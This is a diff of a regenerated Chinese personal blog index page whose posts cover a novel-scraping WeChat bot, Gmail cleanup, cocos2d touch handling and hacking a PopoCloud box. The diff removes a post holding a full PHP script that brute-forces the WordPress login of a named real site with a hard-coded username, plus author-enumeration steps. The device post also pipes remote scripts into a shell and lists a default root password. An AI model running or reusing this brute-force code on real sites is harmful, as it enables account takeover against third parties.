@@ -6,22 +6,19 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <title>双人份 Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description">
-<meta property="og:type" content="website">
+  <meta property="og:type" content="website">
 <meta property="og:title" content="双人份 Blog">
 <meta property="og:url" content="http://doubles.me/page/3/index.html">
 <meta property="og:site_name" content="双人份 Blog">
-<meta property="og:description">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="双人份 Blog">
-<meta name="twitter:description">
   
     <link rel="alternative" href="/rss.xml" title="双人份 Blog" type="application/atom+xml">
   
   
     <link rel="icon" href="/favicon.png">
   
-  <link rel="stylesheet" href="/css/style.css" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
 </head>
 
 <body>
@@ -164,6 +161,71 @@ function dispatch() {
 
       <div class="body-wrap">
   
+    <article id="post-1031" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2014/11/17/1031/" class="article-date">
+  	<time datetime="2014-11-17T18:39:34.000Z" itemprop="datePublished">2014-11-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2014/11/17/1031/">博客待办事项</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><del>自动博客备份（数据库+文件）</del>- 七牛云+sae jobs</p>
+<p><del>垃圾评论过滤，插件没用啊。</del>- 数据库批量删了，使用多说</p>
+<p><del>评论者头像被墙了，wtf。</del>  - 修改主题，使用多说的头像服务</p>
+<p><del>买域名。 </del><span style="color: #000000;">DoublesU.com</span></p>
+<p><del>更新文章啊，混蛋。</del></p>
+<p>代码格式化插件</p>
+<p>文章内容的格式不好看</p>
+<p>Markdown</p>
+<p><del>后台不能生成图片缩略图 </del> 手动编辑吧，在线处理太慢，不如本地传小图</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/Others/">Others</a>
+	</div>
+
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+
+  
     <article id="post-991" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -195,7 +257,7 @@ function dispatch() {
 <p>由于vps坑爹的跑路了，所以转回sae上跑博客，域名也就不绑定了，这个采集本来放openshift上，但是被墙了，好噶，继续sae。</p>
 <p>我们的目标是：  全自动采集推送小说到微信 ，这里大概分3个部分</p>
 <p>文章只写实现过程和注意要点，代码会放在最后的。</p>
-<h2 id="1-_自动小说采集">1. 自动小说采集</h2><p>首先选定一个小说网址，我找到一个，google的排名很靠前啊。唐家三少的绝世唐门，然后看源码，分别要匹配一下他的目录页和内容页。</p>
+<h2 id="1-自动小说采集"><a href="#1-自动小说采集" class="headerlink" title="1. 自动小说采集"></a>1. 自动小说采集</h2><p>首先选定一个小说网址，我找到一个，google的排名很靠前啊。唐家三少的绝世唐门，然后看源码，分别要匹配一下他的目录页和内容页。</p>
 <p><a href="view-source:http://www.douluodalu.com.cn/jueshitangmen" target="_blank" rel="external">view-source:http://www.douluodalu.com.cn/jueshitangmen</a>   看了他的源码发现每次都抓这个页面很费流量，而且也不好排除其他的url是否为小说的更新，然后就从第一章开始采集，每次加载他的下一页。<br><a href="http://7xnueu.com1.z0.glb.clouddn.com/2014/02/QQ20140202175818.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2014/02/QQ20140202175818.png" alt="QQ20140202175818"></a></p>
 <p>打开 第一章 的页面源码 <a href="view-source:http://www.douluodalu.com.cn/jueshitangmen/6860.html" target="_blank" rel="external">view-source:http://www.douluodalu.com.cn/jueshitangmen/6860.html</a>  很自然的找到需要采集的标签， 需要 标题，时间，内容，下一页。如果下一页为空就是到了更新的最后一章了。然后程序就从这个入口开始，采集这几个标签，一直到下一页为空就停止，下次再取最后一个文章地址作为开头继续采集。 先写个函数过滤掉重复，空白，html标签等。空白有空格，n个空格，空行，tab键，等等，所以过滤的正则找了好多，最后效果比较好。然后写正则匹配，取到这几个标签。</p>
 <p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2014/02/QQ20140202180553.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2014/02/QQ20140202180553.png" alt="QQ20140202180553"></a></p>
@@ -210,7 +272,7 @@ function dispatch() {
 <li>description: 自动采集<br>url: app/caiji4sae.php<br>schedule: every 4 hours</li>
 </ul>
 <p><strong><a href="http://7xnueu.com1.z0.glb.clouddn.com/2014/02/QQ20140203010322.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2014/02/QQ20140203010322.png" alt="QQ20140203010322"></a></strong></p>
-<h2 id="2-小说入库Wordpress">2.小说入库Wordpress</h2><p>发布这里费了点事，其实可以使用xmlrpc ， 邮箱发布等，那样采集程序就不用放一个地方跑，sae上放采集程序不是很好，日志什么的很麻烦，流量也贵，本地读写也没有，但是速度快，不然用国外的微信公众平台会没响应。（当然是指免费的云空间）</p>
+<h2 id="2-小说入库Wordpress"><a href="#2-小说入库Wordpress" class="headerlink" title="2.小说入库Wordpress"></a>2.小说入库Wordpress</h2><p>发布这里费了点事，其实可以使用xmlrpc ， 邮箱发布等，那样采集程序就不用放一个地方跑，sae上放采集程序不是很好，日志什么的很麻烦，流量也贵，本地读写也没有，但是速度快，不然用国外的微信公众平台会没响应。（当然是指免费的云空间）</p>
 <p>我在这里使用了直接写数据库的方式，需要先分析一下wordpres的数据表。</p>
 <p>wordpress数据表定义如下，由于我们没有图片，所以 存储文章的包括 wp_posts，wp_term_relationships</p>
 <p>wp_commentmeta：存储评论的元数据<br>wp_comments：存储评论<br>wp_links：存储友情链接（Blogroll）<br>wp_options：存储WordPress系统选项和插件、主题配置<br>wp_postmeta：存储文章（包括页面、上传文件、修订）的元数据<br>wp_posts：存储文章（包括页面、上传文件、修订）<br>wp_terms：存储每个目录、标签<br>wp_term_relationships：存储每个文章、链接和对应分类的关系<br>wp_term_taxonomy：存储每个目录、标签所对应的分类<br>wp_usermeta：存储用户的元数据<br>wp_users：存储用户</p>
@@ -227,7 +289,7 @@ function dispatch() {
 <p>还没完，选择一个单本wordpress小说主题Danx，然后使用Any Mobile Theme  为桌面和手机分别适配2个不同主题，移动主题选择好像不多，我使用了mobilepack 。当然，主题都需要修改一下下，很多不需要的去掉了。</p>
 <p>OK到这里就基本完成了数据的部分了，然后就是推送了。可以预览一下我们的网站和原网站的对比了。</p>
 <p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2014/02/QQ20140202190523.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2014/02/QQ20140202190523.png" alt="QQ20140202190523"></a> <a href="http://7xnueu.com1.z0.glb.clouddn.com/2014/02/QQ20140202190640.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2014/02/QQ20140202190640.png" alt="QQ20140202190640"></a></p>
-<h2 id="3-微信公众平台推送">3.微信公众平台推送</h2><p>这里看需求，可以自己写，我的上一个微信平台就是自己写的，也可以用3方的平台，开源的平台，但是这里我用了个wordpress的插件。任务不多，所以这个应该可以满足的。置于消息实时推送，只能放后面再说，今天时间不多了。找到我爱水煮鱼的微信机器人，安装上配置一下后台地址就OK，不过只有查找功能，最新的消息还没有，等会添加。</p>
+<h2 id="3-微信公众平台推送"><a href="#3-微信公众平台推送" class="headerlink" title="3.微信公众平台推送"></a>3.微信公众平台推送</h2><p>这里看需求，可以自己写，我的上一个微信平台就是自己写的，也可以用3方的平台，开源的平台，但是这里我用了个wordpress的插件。任务不多，所以这个应该可以满足的。置于消息实时推送，只能放后面再说，今天时间不多了。找到我爱水煮鱼的微信机器人，安装上配置一下后台地址就OK，不过只有查找功能，最新的消息还没有，等会添加。</p>
 <p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2014/02/QQ20140203005917.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2014/02/QQ20140203005917.png" alt="QQ20140203005917"></a></p>
 <p>最终的实现效果就是这样了，看起来还不错，不过主题好像没有适配好。<img src="http://7xnueu.com1.z0.glb.clouddn.com/2014/02/20140203005830.png" alt="20140203005830"> <img src="http://7xnueu.com1.z0.glb.clouddn.com/2014/02/20140203010022.png" alt="20140203010022"> <img src="http://7xnueu.com1.z0.glb.clouddn.com/2014/02/20140203010039.png" alt="20140203010039"></p>
 <p> 最后访问地址 <a href="http://iniu.sinaapp.com" target="_blank" rel="external">http://iniu.sinaapp.com</a></p>
@@ -293,11 +355,11 @@ function dispatch() {
     <div class="article-entry" itemprop="articleBody">
       
         <p>Gmail已经5000+的邮件了，都不是有用的邮件，就想着怎么清楚它。弄了半天发现几个方法，分享一下。</p>
-<h2 id="*使用过滤器">*使用过滤器</h2><p>1，在设置里面创建过滤器，<br>2，条件设为不包含“軣“（尽量选择生僻字），<br>3，根据此条件创建过滤器，选择删除邮件，同时勾选”同时将此过滤器应用于与 个会话匹配的xxx“<br>4，到已删除邮件里选择所有，然后在下拉栏里再选择”所有文件“，点删除。</p>
+<h2 id="使用过滤器"><a href="#使用过滤器" class="headerlink" title="*使用过滤器"></a>*使用过滤器</h2><p>1，在设置里面创建过滤器，<br>2，条件设为不包含“軣“（尽量选择生僻字），<br>3，根据此条件创建过滤器，选择删除邮件，同时勾选”同时将此过滤器应用于与 个会话匹配的xxx“<br>4，到已删除邮件里选择所有，然后在下拉栏里再选择”所有文件“，点删除。</p>
 <p>&nbsp;</p>
-<h2 id="*利用imap协议">*利用imap协议</h2><p>去申请一个新的别的地方的信箱，然后设置一下远程收取，并设置收取后删除原件就可以了</p>
+<h2 id="利用imap协议"><a href="#利用imap协议" class="headerlink" title="*利用imap协议"></a>*利用imap协议</h2><p>去申请一个新的别的地方的信箱，然后设置一下远程收取，并设置收取后删除原件就可以了</p>
 <p>&nbsp;</p>
-<h2 id="*全选收件箱">*全选收件箱</h2><p>其实正确的操作方法是这样的：<br>1、点击邮件勾选标签栏上最顶部的勾选框旁的小三角，在下拉菜单里选择“全部”，这样就勾选了当前页面的50个会话。<br>2、这时候会自动弹出一个提示：“此页中的所有 50 会话都已选中。’选择收件箱’ 中的所有 xxx 个会话”<br>3、点击“选择收件箱”，这个时候提示会显示为：已选中 收件箱 中的所有xxx会话。清除选中<br>4、再点击快捷栏上面的垃圾箱图标就可以一次性全部删除。</p>
+<h2 id="全选收件箱"><a href="#全选收件箱" class="headerlink" title="*全选收件箱"></a>*全选收件箱</h2><p>其实正确的操作方法是这样的：<br>1、点击邮件勾选标签栏上最顶部的勾选框旁的小三角，在下拉菜单里选择“全部”，这样就勾选了当前页面的50个会话。<br>2、这时候会自动弹出一个提示：“此页中的所有 50 会话都已选中。’选择收件箱’ 中的所有 xxx 个会话”<br>3、点击“选择收件箱”，这个时候提示会显示为：已选中 收件箱 中的所有xxx会话。清除选中<br>4、再点击快捷栏上面的垃圾箱图标就可以一次性全部删除。</p>
 <p>&nbsp;</p>
 <p>比较推荐使用过滤器，真的很强大，可以筛选出一些邮件保留。</p>
 <p>另外，由于没有装插件，博客的垃圾评论太多了，除了机器人好像没人气似的。</p>
@@ -446,13 +508,13 @@ function dispatch() {
 <p><strong>触摸事件的优先级和消息链</strong></p>
 <p>  虽然已经能响应触摸消息了，但是还是有很多问题没有处理的，比如说谁先谁后，装备栏覆盖了属性栏，那么消息就应该在装备栏被消化掉，属性栏就不应该收到消息等等。</p>
 <p>消息拦截：</p>
-<pre><code>cc.StandardTouchDelegate<span class="keyword">*</span><span class="keyword">*</span> <span class="keyword">*</span><span class="keyword">*</span>将所有的Touch信息直接传递给实现该协议的对象，而cc.TargetedTouchDelegate 则要求实现该代理的类一次只能处理一个事件，并且吃掉该事件，不再传播(swallowTouches=YES;)。
+<pre><code>cc.StandardTouchDelegate** **将所有的Touch信息直接传递给实现该协议的对象，而cc.TargetedTouchDelegate 则要求实现该代理的类一次只能处理一个事件，并且吃掉该事件，不再传播(swallowTouches=YES;)。
 </code></pre><p> 当然还是需要在处理完onTouch 事件后返回false 或者的true的。只不过在onTouchesBegan 中无论返回 true 或者false 都是可以继续传递的，而onTouchBegan 中返回false 可以继续传递，true则被消化掉了。</p>
 <p>不清楚的可以查看这篇博文：<a href="http://blog.csdn.net/tskyfree/article/details/8249689" target="_blank" rel="external">http://blog.csdn.net/tskyfree/article/details/8249689</a></p>
 <p>优先级：</p>
 <p>优先级的值越小优先级反而越高,也就能先响应事件（CCMenu的默认值是-128）</p>
 <p>cc.TargetedTouchDelegate比cc.StandardTouchDelegate优先级高</p>
-<pre><code>cocos2d把响应事件的对像放入一个栈中，用先进后出的规率来响应事件。可以设置响应的优先级 -<span class="number">128</span> - <span class="number">128</span>，最上层的优先级是-<span class="number">128</span>（即值越小越先响应事件）。
+<pre><code>cocos2d把响应事件的对像放入一个栈中，用先进后出的规率来响应事件。可以设置响应的优先级 -128 - 128，最上层的优先级是-128（即值越小越先响应事件）。
 </code></pre><p>响应的规则：</p>
 <ul>
 <li>不同优先级先按优先级响应（即无视入栈顺序，先按优先级响应）</li>
@@ -473,7 +535,7 @@ function dispatch() {
 <p>&nbsp;</p>
 <p>&nbsp;</p>
 <p><strong>给精灵注册触摸事件</strong></p>
-<pre><code>默认cc.Sprite是没有触摸事件的 ，不过我们可以依据layer的实现方法给他添加上去。主要用到这<span class="number">3</span>个事件
+<pre><code>默认cc.Sprite是没有触摸事件的 ，不过我们可以依据layer的实现方法给他添加上去。主要用到这3个事件
 </code></pre><p>cc.Director.getInstance().getTouchDispatcher()._addTargetedDelegate(delegate, priority, swallowsTouches);</p>
 <p>cc.Director.getInstance().getTouchDispatcher()._addStandardDelegate(delegate, priority);</p>
 <p> cc.Director.getInstance().getTouchDispatcher()._removeDelegate(delegate);</p>
@@ -697,7 +759,7 @@ function dispatch() {
     <div class="article-entry" itemprop="articleBody">
       
         <p>双11买的泡泡云，易迅29块钱一个。配置还不错，今天才有网线来折腾一下。</p>
-<h1 id="晒个配置">晒个配置</h1><p>CPU arm926EJ（SoC是AK9806），大概350Mhz（详细看下面）。</p>
+<h1 id="晒个配置"><a href="#晒个配置" class="headerlink" title="晒个配置"></a>晒个配置</h1><p>CPU arm926EJ（SoC是AK9806），大概350Mhz（详细看下面）。</p>
 <p>内置2GByte的flash存储(df查看剩余用户可用1.67G)，256M内存(free查看剩余190M)，ARMV5TE指令集支持，双USB（另一个标记为供电口的需要拆开外壳短接两个电阻位：NR127，NR128）。</p>
 <p>ssh 连接上去看看。</p>
 <p>SSH  root:123456</p>
@@ -712,7 +774,7 @@ function dispatch() {
 <p>&nbsp;</p>
 <p>[root@PopoCloud ~]# dmesg | grep ‘CPU’<br>CPU: ARM926EJ-S [41069265] revision 5 (ARMv5TEJ), cr=00053177<br>CPU: VIVT data cache, VIVT instruction cache<br>ANYKA CPU AK9801 (id 0x20090c00)<br>SLUB: Genslabs=11, HWalign=32, Order=0-3, MinObjects=0, CPUs=1, Nodes=1<br>CPU: Testing write buffer coherency: ok<br>AK98: PLL 360 MHz, CPU Core 360 MHz, MEM 180 MHz, ASIC 90 MHz<br>NAND driver:L2_CPU_MODE<br>CPU Core &gt; 340 MHz</p>
 <p>&nbsp;</p>
-<h1 id="1-装个迅雷">1.装个迅雷</h1><p>以下命令在putty里一条条复制粘帖就行了。</p>
+<h1 id="1-装个迅雷"><a href="#1-装个迅雷" class="headerlink" title="1.装个迅雷"></a>1.装个迅雷</h1><p>以下命令在putty里一条条复制粘帖就行了。</p>
 <p>脚本会自动处理thunder_mounts.cfg，无需手动。</p>
 <p>1.首先插上移动存储设备并挂载到目录（方法自己Google）</p>
 <p>2.下载管理脚本<br>mkdir -p /opt/bin<br>rm -rf /opt/xunlei /opt/bin/xunlei<br>wget <a href="http://lazyzhu.com/file/xunlei" target="_blank" rel="external">http://lazyzhu.com/file/xunlei</a> -P /opt/bin &amp;&amp; chmod +x /opt/bin/xunlei<br>export PATH=/opt/bin:$PATH<br>复制代码<br>3.下载部署迅雷远程主程序<br>xunlei setup<br>复制代码<br>4.启动迅雷远程下载<br>xunlei start<br>复制代码<br>5.获取迅雷远程状态信息（含激活码）<br>xunlei status<br>复制代码<br>6.关闭或重启<br>xunlei stop<br>xunlei restart<br>复制代码<br>7.开机自启动<br>xunlei boot<br>复制代码<br>再次运行可移除。</p>
@@ -720,24 +782,24 @@ function dispatch() {
 <p>/opt/xunlei/portal 可以启动迅雷</p>
 <p>9.重装或升级<br>xunlei setup</p>
 <p><del><span style="color: #ff0000;">一直没有启动成功，后来开了dmz，公网访问后才能得到激活码。不知道什么原因</span></del></p>
-<h1 id="2-取消泡泡云服务">2.取消泡泡云服务</h1><p>编辑文件 /root/rc.popocloud</p>
+<h1 id="2-取消泡泡云服务"><a href="#2-取消泡泡云服务" class="headerlink" title="2.取消泡泡云服务"></a>2.取消泡泡云服务</h1><p>编辑文件 /root/rc.popocloud</p>
 <p>注释掉</p>
-<h1 id="if__stopped_“python”;_then">if _stopped “python”; then</h1><h1 id="start_popocloud">start_popocloud</h1><h1 id="fi">fi</h1><p>reboot ，自带的服务就没了。</p>
-<h1 id="3-关闭minidlna">3.关闭minidlna</h1><p>编辑文件 /root/rc.popocloud<br>vi /root/rc.popocloud<br>编辑掉：</p>
-<h1 id="if__stopped_“minidlna”;_then">if _stopped “minidlna”; then</h1><h1 id="start_minidlna_${ipaddr}_&amp;">start_minidlna ${ipaddr} &amp;</h1><h1 id="else">else</h1><h1 id="stop_minidlna">stop_minidlna</h1><h1 id="fi-1">fi</h1><p>之后保存，/etc/minidlna stop</p>
+<h1 id="if-stopped-“python”-then"><a href="#if-stopped-“python”-then" class="headerlink" title="if _stopped “python”; then"></a>if _stopped “python”; then</h1><h1 id="start-popocloud"><a href="#start-popocloud" class="headerlink" title="start_popocloud"></a>start_popocloud</h1><h1 id="fi"><a href="#fi" class="headerlink" title="fi"></a>fi</h1><p>reboot ，自带的服务就没了。</p>
+<h1 id="3-关闭minidlna"><a href="#3-关闭minidlna" class="headerlink" title="3.关闭minidlna"></a>3.关闭minidlna</h1><p>编辑文件 /root/rc.popocloud<br>vi /root/rc.popocloud<br>编辑掉：</p>
+<h1 id="if-stopped-“minidlna”-then"><a href="#if-stopped-“minidlna”-then" class="headerlink" title="if _stopped “minidlna”; then"></a>if _stopped “minidlna”; then</h1><h1 id="start-minidlna-ipaddr-amp"><a href="#start-minidlna-ipaddr-amp" class="headerlink" title="start_minidlna ${ipaddr} &amp;"></a>start_minidlna ${ipaddr} &amp;</h1><h1 id="else"><a href="#else" class="headerlink" title="else"></a>else</h1><h1 id="stop-minidlna"><a href="#stop-minidlna" class="headerlink" title="stop_minidlna"></a>stop_minidlna</h1><h1 id="fi-1"><a href="#fi-1" class="headerlink" title="fi"></a>fi</h1><p>之后保存，/etc/minidlna stop</p>
 <p>并reboot，miniDlna服务就关闭了。</p>
 <p>DLNA 服务器，配置文件在 /etc/minidlna.conf</p>
-<h1 id="4配置_BT_下载服务_transmission">4配置 BT 下载服务 transmission</h1><p>/etc/transmission start 启动。如果需要自启动，可以在 /etc/init.d/rc.local 最后加上这句就可以了。<br>web 访问： <a href="http://IP:9091。" target="_blank" rel="external">http://IP:9091。</a><br>如果需要手动配置，可以在： /root/transmission/config 目录下，有一个json文件可以配置；<br>建议直接 web 端配置（例如下载目录配置到你的 samba 服务器目录，下载后直接访问）<br>另外 web内容在 /root/transmission/web 下，可以更换汉化版本。</p>
+<h1 id="4配置-BT-下载服务-transmission"><a href="#4配置-BT-下载服务-transmission" class="headerlink" title="4配置 BT 下载服务 transmission"></a>4配置 BT 下载服务 transmission</h1><p>/etc/transmission start 启动。如果需要自启动，可以在 /etc/init.d/rc.local 最后加上这句就可以了。<br>web 访问： <a href="http://IP:9091。" target="_blank" rel="external">http://IP:9091。</a><br>如果需要手动配置，可以在： /root/transmission/config 目录下，有一个json文件可以配置；<br>建议直接 web 端配置（例如下载目录配置到你的 samba 服务器目录，下载后直接访问）<br>另外 web内容在 /root/transmission/web 下，可以更换汉化版本。</p>
 <p>启动： /etc/transmission start (如果需要自启动，加入 /etc/init.d/rc.local 就可以了）</p>
 <p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/11/QQ20131123132532.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/11/QQ20131123132532.png" alt="QQ20131123132532"></a></p>
-<h1 id="5-安装optware">5.安装optware</h1><p>以下命令在putty里一条条复制粘帖就行了</p>
+<h1 id="5-安装optware"><a href="#5-安装optware" class="headerlink" title="5.安装optware"></a>5.安装optware</h1><p>以下命令在putty里一条条复制粘帖就行了</p>
 <p>1.下载部署OptWare<br>feed=<a href="http://ipkg.nslu2-linux.org/feeds/optware/cs08q1armel/cross/unstable" target="_blank" rel="external">http://ipkg.nslu2-linux.org/feeds/optware/cs08q1armel/cross/unstable</a><br>ipk_name=<code>wget -qO- $feed/Packages | awk &#39;/^Filename: ipkg-opt/ {print $2}&#39;</code><br>wget $feed/$ipk_name<br>tar -xOvzf $ipk_name ./data.tar.gz | tar -C / -xzvf -<br>mkdir -p /opt/tmp<br>mkdir -p /opt/etc/ipkg<br>echo “src cross $feed” &gt; /opt/etc/ipkg/feeds.conf<br>复制代码<br>2.配置环境变量<br>LD_LIBRARY_PATH=/opt/lib:/lib:/usr/lib<br>sed -i “s#LD_LIBRARY_PATH=.<em>#LD_LIBRARY_PATH=${LD_LIBRARY_PATH}#g” /etc/profile<br>PATH=/opt/bin:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin<br>sed -i “s#PATH=.</em>#PATH=${PATH}#g” /etc/profile<br>. /etc/profile</p>
 <p>3.ipkg安装实例<br>ipkg update<br>ipkg install ncurses nano<br>which nano</p>
 <p>提醒：目前Popobox没有不死uboot，所以操作需谨慎！</p>
 <p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/11/QQ20131123132532.png" target="_blank" rel="external"> </a></p>
 <p>最后，总共找到了这些资料</p>
 <p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/11/QQ20131123133905.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/11/QQ20131123133905.png" alt="QQ20131123133905"></a></p>
-<h2 id="2014-1-31更新">2014.1.31更新</h2><p>回家过年更新了一遍，但是没有网络，最后蹭到了邻居家的wifi。密码是1到9.然后就考虑怎么来搞搞，最后用路由桥接了这个信号。</p>
+<h2 id="2014-1-31更新"><a href="#2014-1-31更新" class="headerlink" title="2014.1.31更新"></a>2014.1.31更新</h2><p>回家过年更新了一遍，但是没有网络，最后蹭到了邻居家的wifi。密码是1到9.然后就考虑怎么来搞搞，最后用路由桥接了这个信号。</p>
 <p>开启wds，然后扫描到ap，设置好保存，这样就可以连接上我的泡泡云了。</p>
 <p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/11/QQ20140131224250.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/11/QQ20140131224250.png" alt="QQ20140131224250"></a></p>
 <p>开启dhcp，不启用的话我们的泡泡云没有ip，不能自动获取ip就ssh不上了。网关要选桥接的那个路由内网地址。<br><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/11/QQ20140131224321.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/11/QQ20140131224321.png" alt="QQ20140131224321"></a></p>
@@ -918,90 +980,6 @@ function dispatch() {
   
 
   
-    <article id="post-886" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2013/09/27/886/" class="article-date">
-  	<time datetime="2013-09-27T15:37:53.000Z" itemprop="datePublished">2013-09-27</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2013/09/27/886/">暴力破解wordpress后台</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>主要来源是 wooyun的 <a href="http://wooyun.org/bugs/wooyun-2010-028908" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2010-028908</a></p>
-<p>说说方法，先得到用户名 ，就是通过遍历这个地址的author</p>
-<p><a href="http://www.lufuli.com/?author=1" target="_blank" rel="external">http://www.lufuli.com/?author=1</a></p>
-<p>然后会跳转到一个地址，没错了，这个就是用户名。</p>
-<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/09/QQ20130928023349.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/09/QQ20130928023349.png" alt="QQ20130928023349"></a> <a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/09/QQ20130928023648.png" target="_blank" rel="external">
-</a></p>
-<p>然后我使用的是php 写的脚本，遗憾的是只能单线程。</p>
-<p>修改一下username，和url，准备字典就跑起来吧。</p>
-<p>成功后会自动结束，查看文件log.txt里面有密码。</p>
-<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/09/QQ20130928023648.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/09/QQ20130928023648.png" alt="QQ20130928023648"></a></p>
-<p>&nbsp;</p>
-<p>&nbsp;</p>
-<p>代码直接放这里了。由于vps内存比较小，只能按行读取了。</p>
-<p>&lt;?php</p>
-<p>$username = “yekai”;<br>$file = fopen(‘pass.txt’,’r’);<br>$url = “<a href="http://lufuli.com" target="_blank" rel="external">http://lufuli.com</a>“;</p>
-<p>while (!feof($file))<br>{<br>$now=fgets($file);//读入所有的内容</p>
-<p>$PostUrl = $url.’/wp-login.php’;<br>$_Path_status_code = GetHttpStatusCode(Trim($PostUrl));<br>//echo $PostUrl.’ ‘.$_Path_status_code.”\n”;<br>if (‘404’ == $_Path_status_code)<br>{<br>Continue;<br>}<br>$username = Trim($username);</p>
-<p>$now = Trim($now);<br>$curlPost = ‘log=’.$username.’&amp;pwd=’.urlencode($now);<br>$Rs = POST_Data($PostUrl, $curlPost);<br>$fail_tag = ‘&lt;strong&gt;’.$username.’&lt;/strong&gt;’;<br>if (stristr($Rs, ‘&lt;strong&gt;ERROR&lt;/strong&gt;: Invalid username’)) # 不存在的用户名跳过猜解<br>{<br>Break;<br>}<br>if (!stristr($Rs, $fail_tag))<br>{<br>file_put_contents(“log.txt”,$PostUrl.’ ‘.’Password:’.$now.’ # Succed!’.”\r\n”,FILE_APPEND);<br>exit();<br>}else{<br>echo ‘Password:’.$now.”failed\r\n”;<br>}</p>
-<p>}</p>
-<p>fclose($file);</p>
-<p>&nbsp;</p>
-<p>&nbsp;<br>function GetHttpStatusCode($url){<br>$curl = curl_init();<br>curl_setopt($curl,CURLOPT_URL,$url);//获取内容url<br>curl_setopt($curl,CURLOPT_HEADER,1);//获取http头信息<br>curl_setopt($curl,CURLOPT_NOBODY,1);//不返回html的body信息<br>curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);//返回数据流，不直接输出<br>curl_setopt($curl,CURLOPT_TIMEOUT,3); //超时时长，单位秒<br>curl_exec($curl);<br>$rtn= curl_getinfo($curl,CURLINFO_HTTP_CODE);<br>curl_close($curl);<br>return $rtn;<br>}<br>function POST_Data($PostUrl, $DATA)<br>{<br>$ch = curl_init();//初始化curl<br>curl_setopt($ch,CURLOPT_URL, $PostUrl);//抓取指定网页<br>curl_setopt($ch, CURLOPT_HEADER, 0);//设置header<br>curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//要求结果为字符串且输出到屏幕上<br>curl_setopt($ch, CURLOPT_POST, 1);//post提交方式<br>curl_setopt($ch, CURLOPT_POSTFIELDS, $DATA);<br>$data = curl_exec($ch);//运行curl<br>curl_close($ch);<br>return $data;//输出结果<br>}<br>?&gt;</p>
-<p>&nbsp;</p>
-<p>&nbsp;</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hack/">hack</a></li></ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-	<a class="article-category-link" href="/categories/Hack/">Hack</a>
-	</div>
-
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-
-  
   
     <nav id="page-nav">
       <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
@@ -1027,7 +1005,7 @@ function dispatch() {
 </footer>
     </div>
     
-  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
 
 
 <script>
@@ -1043,8 +1021,8 @@ function dispatch() {
 		open_in_new: false
 	}
 </script>
-<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js" type="text/javascript"></script>
-<script src="/js/main.js" type="text/javascript"></script>
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
 
 
 
